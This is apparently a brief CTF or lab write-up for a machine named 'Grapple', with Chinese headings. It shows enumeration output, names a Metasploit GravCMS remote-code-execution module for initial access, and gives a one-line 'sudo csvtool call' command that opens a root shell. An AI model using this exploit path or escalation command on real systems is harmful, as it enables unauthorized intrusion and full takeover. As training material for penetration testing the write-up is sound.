# Grapple

## 信息收集

```bash
Detected ss and lsof, executing related commands...
Port: 8888, PID: 937
—> Command: /usr/bin/python3 /usr/local/bin/jupyter-notebook --allow-root --NotebookApp.token= --NotebookApp.password= 
Port: 33060, PID: 972
—> Command: /usr/sbin/mysqld 
Port: 8999, PID: 987
—> Command: php-fpm: master process (/opt/php/php8/etc/php-fpm.conf)               
Port: 3306, PID: 972
—> Command: /usr/sbin/mysqld 
Port: 22, PID: 915
—> Command: sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 

## ———————————————————————————— ##

Nginx is not installed.

## ———————————————————————————— ##

Detected apache, analyzing its configuration...

Unique Hosts:


## ———————————————————————————— ##

Checking /etc/sudoers (active configurations only):
  Defaults      env_reset
  Defaults      mail_badpass
  Defaults      secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
  root  ALL=(ALL:ALL) ALL
  david ALL=(ALL) NOPASSWD: /usr/bin/csvtool *
  www-data      ALL=(ALL) NOPASSWD: /usr/bin/csvtool *
  %admin ALL=(ALL) ALL
  %sudo ALL=(ALL:ALL) ALL
———
Finding SUID files:
  root  ALL=(ALL:ALL) ALL
  david ALL=(ALL) NOPASSWD: /usr/bin/csvtool *
  www-data      ALL=(ALL) NOPASSWD: /usr/bin/csvtool *
  %admin ALL=(ALL) ALL
  %sudo ALL=(ALL:ALL) ALL
———
Finding files with special capabilities:
  /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
  /usr/bin/arping = cap_net_raw+ep
  /usr/bin/ping = cap_net_raw+ep
  /usr/bin/mtr-packet = cap_net_raw+ep
  /usr/bin/traceroute6.iputils = cap_net_raw+ep
———
```

## Grav cms

![img](img/image_20250429-202908.png)

直接 msf 打 `exploit/linux/http/gravcms_exec`

```plaintext
http://10.10.110.102/
```

## 提权

```bash
sudo csvtool call '/bin/sh;false' /etc/passwd
```
